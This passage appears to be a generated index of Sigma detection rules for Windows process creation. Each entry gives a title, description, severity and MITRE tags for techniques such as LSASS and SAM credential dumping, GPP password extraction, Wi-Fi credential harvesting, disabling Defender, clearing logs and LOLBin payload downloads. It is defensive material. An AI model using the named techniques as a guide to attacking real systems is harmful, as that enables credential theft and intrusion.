    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_dsim_remove.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md#atomic-test-26---disable-windows-defender-with-dism

    
### Suspicious MsiExec Embedding Parent
    
    Adversaries may abuse msiexec.exe to proxy the execution of malicious payloads

    * Level: medium
    * MITRE: attack.t1218.007
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_msiexec_embedding.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.007/T1218.007.md

    
### Exploit for CVE-2017-8759
    
    Detects Winword starting uncommon sub process csc.exe as used in exploits for CVE-2017-8759

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.t1203
    * MITRE: attack.t1204.002
    * MITRE: attack.initial_access
    * MITRE: attack.t1566.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_exploit_cve_2017_8759.yml
* https://www.hybrid-analysis.com/sample/0b4ef455e385b750d9f90749f1467eaf00e46e8d6c2885c260e1b78211a51684?environmentId=100

* https://www.reverse.it/sample/0b4ef455e385b750d9f90749f1467eaf00e46e8d6c2885c260e1b78211a51684?environmentId=100

    
### Execution via Diskshadow.exe
    
    Detects using Diskshadow.exe to execute arbitrary code in text file

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_diskshadow.yml
* https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/

* https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration

    
### Use Radmin Viewer Utility
    
    An adversary may use Radmin Viewer Utility to remotely control Windows device

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1072
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_radmin.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1072/T1072.md#atomic-test-1---radmin-viewer-utility

* https://www.radmin.fr/

    
### Registry Parse with Pypykatz
    
    Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through Windows Registry where the SAM database is stored

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_pypykatz.yml
* https://github.com/skelsec/pypykatz

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md#atomic-test-2---registry-parse-with-pypykatz

    
### ZxShell Malware
    
    Detects a ZxShell start by the called and well-known function name

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.t1059.003
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.011
    * MITRE: attack.s0412
    * MITRE: attack.g0001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_zxshell.yml
* https://www.hybrid-analysis.com/sample/5d2a4cde9fa7c2fdbf39b2e2ffd23378d0c50701a3095d1e91e3cf922d7b0b16?environmentId=100

    
### CrackMapExec Command Line Flags
    
    This rule detect common flag combinations used by CrackMapExec in order to detect its use even if the binary has been replaced.

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_crackmapexec_flags.yml
* https://mpgn.gitbook.io/crackmapexec/smb-protocol/authentication/checking-credentials-local

* https://www.mandiant.com/resources/telegram-malware-iranian-espionage

* https://www.infosecmatter.com/crackmapexec-module-library/?cmem=mssql-mimikatz

* https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-pe_inject

    
### ScreenConnect Backstage Mode Anomaly
    
    Detects suspicious sub processes started by the ScreenConnect client service, which indicates the use of the so-called Backstage mode

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1219
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_screenconnect_anomaly.yml
* https://www.mandiant.com/resources/telegram-malware-iranian-espionage

* https://docs.connectwise.com/ConnectWise_Control_Documentation/Get_started/Host_client/View_menu/Backstage_mode

    
### CobaltStrike Load by Rundll32
    
    Rundll32 can be use by Cobalt Strike with StartW function to load DLLs from the command line.

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.011
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_cobaltstrike_load_by_rundll32.yml
* https://www.cobaltstrike.com/help-windows-executable

* https://redcanary.com/threat-detection-report/

* https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/

    
### Execution in Webserver Root Folder
    
    Detects a suspicious program execution in a web service root folder (filter out false positives)

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1505.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_execution_path_webserver.yml
    
### Abusing IEExec To Download Payloads
    
    Detects execution of the IEExec utility to download payloads

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_lolbas_ieexec_download.yml
* https://lolbas-project.github.io/lolbas/Binaries/Ieexec/

    
### Suspicious Download from Office Domain
    
    Detects suspicious ways to download files from Microsoft domains that are used to store attachments in Emails or OneNote documents

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_download_office_domain.yml
* https://twitter.com/an0n_r0/status/1474698356635193346?s=12

* https://twitter.com/mrd0x/status/1475085452784844803?s=12

    
### DumpMinitool Usage
    
    Detects the use of a Visual Studio bundled tool named DumpMinitool.exe

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_proc_dump_dumpminitool.yml
* https://twitter.com/mrd0x/status/1511415432888131586?s=20&t=DvVrzeZ1OcGiWowbhPV8Lg

* https://twitter.com/mrd0x/status/1511489821247684615

    
### New Lolbin Process by Office Applications
    
    This rule will monitor any office apps that spins up a new LOLBin process. This activity is pretty suspicious and should be investigated.

    * Level: high
    * MITRE: attack.t1204.002
    * MITRE: attack.t1047
    * MITRE: attack.t1218.010
    * MITRE: attack.execution
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_lolbins_by_office_applications.yml
* https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/

* https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/main/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml

    
### Shells Spawn by Java
    
    Detects shell spawn from Java host process, which could a maintenance task or some kind of exploitation (e.g. log4j exploitation)

    * Level: medium
    * MITRE: attack.initial_access
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_shell_spawn_by_java.yml
    
### Detect Virtualbox Driver Installation OR Starting Of VMs
    
    Adversaries can carry out malicious operations using a virtual instance to avoid detection. This rule is built to detect the registration of the Virtualbox driver or start of a Virtualbox VM.

    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1564.006
    * MITRE: attack.t1564
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_run_virtualbox.yml
* https://attack.mitre.org/techniques/T1564/006/

* https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/

* https://threatpost.com/maze-ransomware-ragnar-locker-virtual-machine/159350/

    
### CreateDump Process Dump
    
    Detects uses of the createdump.exe LOLOBIN utility to dump process memory

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_proc_dump_createdump.yml
* https://www.crowdstrike.com/blog/overwatch-exposes-aquatic-panda-in-possession-of-log-4-shell-exploit-tools/

    
### Invoke-Obfuscation VAR+ Launcher
    
    Detects Obfuscated use of Environment Variables to execute PowerShell

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_invoke_obfuscation_var.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Suspicious Netsh DLL Persistence
    
    Detects persitence via netsh helper

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1546.007
    * MITRE: attack.s0108
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_netsh_dll_persistence.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.007/T1546.007.md

* https://attack.mitre.org/software/S0108/

    
### Suspicious Reg Add BitLocker
    
    Suspicious add key for BitLocker

    * Level: medium
    * MITRE: attack.impact
    * MITRE: attack.t1486
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_reg_bitlocker.yml
* https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/

    
### SecurityXploded Tool
    
    Detects the execution of SecurityXploded Tools

    * Level: critical
    * MITRE: attack.credential_access
    * MITRE: attack.t1555
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_hack_secutyxploded.yml
* https://securityxploded.com/

* https://cyberx-labs.com/blog/gangnam-industrial-style-apt-campaign-targets-korean-industrial-companies/

    
### Sensitive Registry Access via Volume Shadow Copy
    
    Detects a command that accesses password storing registry hives via volume shadow backups

    * Level: medium
    * MITRE: attack.impact
    * MITRE: attack.t1490
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_malware_conti_shadowcopy.yml
* https://twitter.com/vxunderground/status/1423336151860002816?s=20

* https://www.virustotal.com/gui/file/03e9b8c2e86d6db450e5eceec057d7e369ee2389b9daecaf06331a95410aa5f8/detection

    
### Encoded IEX
    
    Detects a base64 encoded IEX command string in a process command line

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_encoded_iex.yml
    
### Invoke-Obfuscation Obfuscated IEX Invocation
    
    Detects all variations of obfuscated powershell IEX invocation code generated by Invoke-Obfuscation framework from the following code block

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_invoke_obfuscation_obfuscated_iex_commandline.yml
* https://github.com/danielbohannon/Invoke-Obfuscation/blob/master/Out-ObfuscatedStringCommand.ps1#L873-L888

    
### Use of ScreenConnect Remote Access Software
    
    An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.
These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.
Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land) 


    * Level: medium
    * MITRE: attack.command_and_control
    * MITRE: attack.t1219
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_screenconnect.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1219/T1219.md#atomic-test-5---screenconnect-application-download-and-install-on-windows

    
### Operation Wocao Activity
    
    Detects activity mentioned in Operation Wocao report

    * Level: high
    * MITRE: attack.discovery
    * MITRE: attack.t1012
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036.004
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1053.005
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_wocao.yml
* https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/

* https://twitter.com/SBousseaden/status/1207671369963646976

    
### Esentutl Gather Credentials
    
    Conti recommendation to its affiliates to use esentutl to access NTDS dumped file. Trickbot also uses this utilities to get MSEdge info via its module pwgrab.

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1003
    * MITRE: attack.t1003.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_esentutl_params.yml
* https://twitter.com/vxunderground/status/1423336151860002816

* https://attack.mitre.org/software/S0404/

* https://thedfirreport.com/2021/08/01/bazarcall-to-conti-ransomware-via-trickbot-and-cobalt-strike/

    
### Uninstall Sysinternals Sysmon
    
    Detects the uninstallation of Sysinternals Sysmon, which could be the result of legitimate administration or a manipulation for defense evasion

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_uninstall_sysmon.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md#atomic-test-11---uninstall-sysmon

    
### Suspicious Use of PsLogList
    
    Threat actors can use the PsLogList utility to dump event log in order to extract admin accounts and perform account discovery.

    * Level: medium
    * MITRE: attack.discovery
    * MITRE: attack.t1087
    * MITRE: attack.t1087.001
    * MITRE: attack.t1087.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_psloglist.yml
* https://research.nccgroup.com/2021/01/12/abusing-cloud-services-to-fly-under-the-radar/

* https://www.cybereason.com/blog/deadringer-exposing-chinese-threat-actors-targeting-major-telcos

* https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Sysinternals/PsLogList

    
### Use of Anydesk Remote Access Software
    
    An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.
These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.
Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land) 


    * Level: medium
    * MITRE: attack.command_and_control
    * MITRE: attack.t1219
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_anydesk.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1219/T1219.md#atomic-test-2---anydesk-files-detected-test-on-windows

    
### Suspicious Bitstransfer via PowerShell
    
    Detects transferring files from system on a server bitstransfer Powershell cmdlets

    * Level: medium
    * MITRE: attack.exfiltration
    * MITRE: attack.persistence
    * MITRE: attack.t1197
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_bitstransfer.yml
* https://docs.microsoft.com/en-us/powershell/module/bitstransfer/add-bitsfile?view=windowsserver2019-ps

    
### Run from a Zip File
    
    Payloads may be compressed, archived, or encrypted in order to avoid detection

    * Level: medium
    * MITRE: attack.impact
    * MITRE: attack.t1485
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_run_from_zip.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027/T1027.md#atomic-test-4---execution-from-compressed-file

    
### Indirect Command Execution
    
    Detect indirect command execution via Program Compatibility Assistant (pcalua.exe or forfiles.exe).

    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1202
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_indirect_cmd.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1202/T1202.md

* https://eqllib.readthedocs.io/en/latest/analytics/884a7ccd-7305-4130-82d0-d4f90bc118b6.html

    
### Suspicious Reconnaissance Activity
    
    Detects suspicious command line activity on Windows systems

    * Level: medium
    * MITRE: attack.discovery
    * MITRE: attack.t1087.001
    * MITRE: attack.t1087.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_recon_activity.yml
* https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/

* https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/

    
### Password Cracking with Hashcat
    
    Execute Hashcat.exe with provided SAM file from registry of Windows and Password list to crack against

    * Level: critical
    * MITRE: attack.credential_access
    * MITRE: attack.t1110.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_hashcat.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.002/T1110.002.md#atomic-test-1---password-cracking-with-hashcat

* https://hashcat.net/wiki/doku.php?id=hashcat

    
### Harvesting of Wifi Credentials Using netsh.exe
    
    Detect the harvesting of wifi credentials using netsh.exe

    * Level: medium
    * MITRE: attack.discovery
    * MITRE: attack.credential_access
    * MITRE: attack.t1040
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_netsh_wifi_credential_harvesting.yml
* https://blog.malwarebytes.com/threat-analysis/2020/04/new-agenttesla-variant-steals-wifi-credentials/

    
### Automated Collection Command Prompt
    
    Once established within a system or network, an adversary may use automated techniques for collecting internal data.

    * Level: medium
    * MITRE: attack.collection
    * MITRE: attack.t1119
    * MITRE: attack.credential_access
    * MITRE: attack.t1552.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_automated_collection.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1119/T1119.md

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.001/T1552.001.md

    
### Suspicious DIR Execution
    
    Use dir to collect information

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1217
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_dir.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1217/T1217.md

    
### ADCSPwn Hack Tool
    
    Detects command line parameters used by ADCSPwn, a tool to escalate privileges in an active directory network by coercing authenticate from machine accounts and relaying to the certificate service

    * Level: critical
    * MITRE: attack.credential_access
    * MITRE: attack.t1557.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_hack_adcspwn.yml
* https://github.com/bats3c/ADCSPwn

    
### Use of TTDInject.exe
    
    Detects the executiob of TTDInject.exe, which is used by Windows 10 v1809 and newer to debug time travel (underlying call of tttracer.exe)

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1127
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_lolbin_ttdinject.yml
* https://lolbas-project.github.io/lolbas/Binaries/Ttdinject/

    
### Formbook Process Creation
    
    Detects Formbook like process executions that inject code into a set of files in the System32 folder, which executes a special command command line to delete the dropper from the AppData Temp folder. We avoid false positives by excluding all parent process with command line parameters.

    * Level: critical
    * MITRE: attack.develop_capabilities
    * MITRE: attack.t1587.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_malware_formbook.yml
* https://inquest.net/blog/2018/06/22/a-look-at-formbook-stealer

* https://app.any.run/tasks/388d5802-aa48-4826-b069-250420504758/

* https://app.any.run/tasks/8e22486b-5edc-4cef-821c-373e945f296c/

* https://app.any.run/tasks/62bb01ae-25a4-4180-b278-8e464a90b8d7/

    
### Suspicious Eventlog Clear or Configuration Using Wevtutil
    
    Detects clearing or configuration of eventlogs using wevtutil, powershell and wmic. Might be used by ransomwares during the attack (seen by NotPetya and others).

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070.001
    * MITRE: car.2016-04-002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_eventlog_clear.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.001/T1070.001.md

* https://eqllib.readthedocs.io/en/latest/analytics/5b223758-07d6-4100-9e11-238cfdd0fe97.html

    
### EvilNum Golden Chickens Deployment via OCX Files
    
    Detects Golden Chickens deployment method as used by Evilnum in report published in July 2020

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.011
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_evilnum_jul20.yml
* https://www.welivesecurity.com/2020/07/09/more-evil-deep-look-evilnum-toolset/

* https://app.any.run/tasks/33d37fdf-158d-4930-aa68-813e1d5eb8ba/

    
### Malicious Payload Download via Office Binaries
    
    Downloads payload from remote server

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1105
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_msoffice.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Powerpnt.yml

* https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191

* Reegun J (OCBC Bank)

    
### Powershell Used To Disable Windows Defender AV Security Monitoring
    
    Detects attackers attempting to disable Windows Defender using Powershell

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_powershell_disable_windef_av.yml
* https://research.nccgroup.com/2020/06/23/wastedlocker-a-new-ransomware-variant-developed-by-the-evil-corp-group/

* https://rvsec0n.wordpress.com/2020/01/24/malwares-that-bypass-windows-defender/

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md

    
### Possible SPN Enumeration
    
    Detects Service Principal Name Enumeration used for Kerberoasting

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1558.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_spn_enum.yml
* https://p16.praetorian.com/blog/how-to-use-kerberoasting-t1208-for-privilege-escalation

    
### Lazarus Activity
    
    Detects different process creation events as described in various threat reports on Lazarus group activity

    * Level: critical
    * MITRE: attack.g0032
    * MITRE: attack.execution
    * MITRE: attack.t1059
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_lazarus_activity_dec20.yml
* https://securelist.com/lazarus-covets-covid-19-related-intelligence/99906/

* https://www.hvs-consulting.de/lazarus-report/

    
### Whoami Execution
    
    Detects the execution of whoami, which is often used by attackers after exploitation / privilege escalation but rarely used by administrators

    * Level: medium
    * MITRE: attack.discovery
    * MITRE: attack.t1033
    * MITRE: car.2016-03-001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_whoami.yml
* https://brica.de/alerts/alert/public/1247926/agent-tesla-keylogger-delivered-inside-a-power-iso-daa-archive/

* https://app.any.run/tasks/7eaba74e-c1ea-400f-9c17-5e30eee89906/

    
### Hidden Powershell in Link File Pattern
    
    Detects events that appear when a user click on a link file with a powershell command in it

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_embed_exe_lnk.yml
* https://www.x86matthew.com/view_post?id=embed_exe_lnk

    
### Suspicious Child Process Created as System
    
    Detection of child processes spawned with SYSTEM privileges by parents with LOCAL SERVICE or NETWORK SERVICE accounts

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1134.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_child_process_as_system_.yml
* https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment

* https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/

* https://github.com/antonioCoco/RogueWinRM

* https://twitter.com/Cyb3rWard0g/status/1453123054243024897

    
### Suspicious Parent of Csc.exe
    
    Detects a suspicious parent of csc.exe, which could by a sign of payload delivery

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.005
    * MITRE: attack.t1059.007
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.005
    * MITRE: attack.t1027.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_csc.yml
* https://twitter.com/SBousseaden/status/1094924091256176641

    
### Findstr GPP Passwords
    
    Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt.

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1552.006
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_findstr_gpp_passwords.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.006/T1552.006.md#atomic-test-1---gpp-passwords-findstr

    
### Encoded FromBase64String
    
    Detects a base64 encoded FromBase64String keyword in a process command line

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1140
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_encoded_frombase64string.yml
    
### Shells Spawned by Web Servers
    
    Web servers that spawn shell processes could be the result of a successfully placed web shell or an other attack

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1505.003
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_webshell_spawn.yml
    
### BlueMashroom DLL Load
    
    Detects a suspicious DLL loading from AppData Local path as described in BlueMashroom report

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.010
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_bluemashroom.yml
* https://www.virusbulletin.com/conference/vb2019/abstracts/apt-cases-exploiting-vulnerabilities-region-specific-software

    
### Rundll32 JS RunHTMLApplication Pattern
    
    Detects suspicious command line patterns used when rundll32 is used to run JavaScript code

    * Level: high
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_rundll32_js_runhtmlapplication.yml
* http://hyp3rlinx.altervista.org/advisories/MICROSOFT_WINDOWS_DEFENDER_DETECTION_BYPASS.txt

    
### Renamed jusched.exe
    
    Detects renamed jusched.exe used by cobalt group

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_renamed_jusched.yml
* https://www.bitdefender.com/files/News/CaseStudies/study/262/Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf

    
### MavInject Process Injection
    
    Detects process injection using the signed Windows tool Mavinject32.exe

    * Level: critical
    * MITRE: attack.t1055.001
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_mavinject_proc_inj.yml
* https://twitter.com/gN3mes1s/status/941315826107510784

* https://reaqta.com/2017/12/mavinject-microsoft-injector/

* https://twitter.com/Hexacorn/status/776122138063409152

    
### Dumpert Process Dumper
    
    Detects the use of Dumpert process dumper, which dumps the lsass.exe process memory

    * Level: critical
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_hack_dumpert.yml
* https://github.com/outflanknl/Dumpert

* https://unit42.paloaltonetworks.com/actors-still-exploiting-sharepoint-vulnerability/

    
### ScreenConnect Remote Access
    
    Detects ScreenConnect program starts that establish a remote access to that system (not meeting, not remote support)

    * Level: high
    * MITRE: attack.initial_access
    * MITRE: attack.t1133
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_screenconnect_access.yml
* https://www.anomali.com/blog/probable-iranian-cyber-actors-static-kitten-conducting-cyberespionage-campaign-targeting-uae-and-kuwait-government-agencies

    
### Script Event Consumer Spawning Process
    
    Detects a suspicious child process of Script Event Consumer (scrcons.exe).

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1047
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_script_event_consumer_spawn.yml
* https://redcanary.com/blog/child-processes/

* https://docs.paloaltonetworks.com/cortex/cortex-xdr/cortex-xdr-analytics-alert-reference/cortex-xdr-analytics-alert-reference/scrcons-exe-rare-child-process.html

    
### Use of GoToAssist Remote Access Software
    
    An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.
These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.
Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land) 


    * Level: medium
    * MITRE: attack.command_and_control
    * MITRE: attack.t1219
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_gotoopener.yml
